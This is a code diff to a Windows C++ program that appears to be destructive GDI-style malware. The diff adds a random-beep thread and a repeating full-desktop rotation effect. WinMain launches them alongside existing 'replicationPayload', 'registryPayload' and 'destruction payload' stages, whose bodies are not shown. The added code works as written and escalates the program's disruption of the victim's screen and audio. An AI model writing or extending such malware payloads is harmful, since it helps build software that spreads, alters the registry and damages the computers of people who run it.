@@ -13,6 +13,13 @@
 #include <tlhelp32.h>
 #include <ctime>
 #include <cstdlib>
+#include <random>
+#include <cmath>
+
+// Define Pi if not available
+#ifndef M_PI
+#define M_PI 3.14159265358979323846
+#endif
 
 // Link GDI, Multimedia, and Shell libraries
 #pragma comment(lib, "gdi32.lib")
@@ -122,6 +129,87 @@ void changeColors() {
         std::this_thread::sleep_for(std::chrono::milliseconds(1450));
     }
     ReleaseDC(0, hdc);
+}
+
+// --- RANDOM BEEP GENERATOR --- //
+
+void randomBeepGenerator() {
+    // Setup standard random number generation engine
+    std::random_device rd;
+    std::mt19937 gen(rd());
+    
+    // Define the range for pitches (frequencies in Hz)
+    // Low pitch (e.g., 200 Hz) to High pitch (e.g., 3000 Hz)
+    std::uniform_int_distribution<> freqDist(200, 3000);
+
+    while (!isEnding) {
+        // Generate a random frequency
+        int randomFrequency = freqDist(gen);
+
+        // Play the beep
+        // 80ms duration leaves a tiny gap before the 100ms interval ends
+        Beep(randomFrequency, 80);
+
+        // Sleep for 0.1 seconds (100 milliseconds) total interval
+        std::this_thread::sleep_for(std::chrono::milliseconds(100));
+    }
+}
+
+// --- SCREEN ROTATION ILLUSION --- //
+
+void rotateScreenEffect() {
+    // Get the desktop DC (Source) and create a compatible DC for manipulation
+    HDC hdcSrc = GetDC(0);
+    int sw = GetSystemMetrics(0);
+    int sh = GetSystemMetrics(1);
+    
+    // Determine the center point of the screen
+    double cx = sw / 2.0;
+    double cy = sh / 2.0;
+    
+    double currentAngle = 0.0;
+
+    while (!isEnding) {
+        // Increment the angle by 20 degrees converted to radians
+        currentAngle += 20.0 * (M_PI / 180.0);
+        
+        // Keep the angle within a standard 0 to 2*PI circle
+        if (currentAngle >= 2.0 * M_PI) {
+            currentAngle -= 2.0 * M_PI;
+        }
+
+        double cosA = cos(currentAngle);
+        double sinA = sin(currentAngle);
+
+        // PlgBlt requires an array of 3 points defining the destination parallelogram:
+        // lpPoint[0] = Top-Left corner of destination
+        // lpPoint[1] = Top-Right corner of destination
+        // lpPoint[2] = Bottom-Left corner of destination
+        POINT lpPoint[3];
+
+        // Helper lambda to rotate a coordinate around the screen center
+        auto rotatePoint = [&](double x, double y) -> POINT {
+            POINT p;
+            p.x = static_cast<LONG>(cx + (x - cx) * cosA - (y - cy) * sinA);
+            p.y = static_cast<LONG>(cy + (x - cx) * sinA + (y - cy) * cosA);
+            return p;
+        };
+
+        // Calculate the rotated positions for the three critical corners
+        lpPoint[0] = rotatePoint(0, 0);   // Rotated Top-Left
+        lpPoint[1] = rotatePoint(sw, 0);  // Rotated Top-Right
+        lpPoint[2] = rotatePoint(0, sh);  // Rotated Bottom-Left
+
+        // Blit the standard desktop screen onto the calculated rotated parallelogram
+        PlgBlt(hdcSrc, lpPoint, hdcSrc, 0, 0, sw, sh, NULL, 0, 0);
+
+        // Sleep for 1 second before the next rotation step
+        std::this_thread::sleep_for(std::chrono::seconds(1));
+    }
+
+    // Force a complete desktop redraw to restore the normal layout when finished
+    InvalidateRect(NULL, NULL, TRUE);
+    ReleaseDC(0, hdcSrc);
 }
 
 // --- SCREEN MULTIPLIER EFFECT --- //
@@ -493,9 +581,11 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     std::thread(replicationPayload).detach(); 
     std::thread(registryPayload).detach();    
 
-    // 80 Seconds - Start screen color changer
+    // 80 Seconds - Start screen color changer & random beep generator & screen rotation effect
     std::this_thread::sleep_for(std::chrono::seconds(20));
     std::thread(changeColors).detach();
+    std::thread(randomBeepGenerator).detach();
+    std::thread(rotateScreenEffect).detach();
 
     // 100 Seconds - Start screen multiplier effect & scramble clock & destruction payload
     std::this_thread::sleep_for(std::chrono::seconds(20));
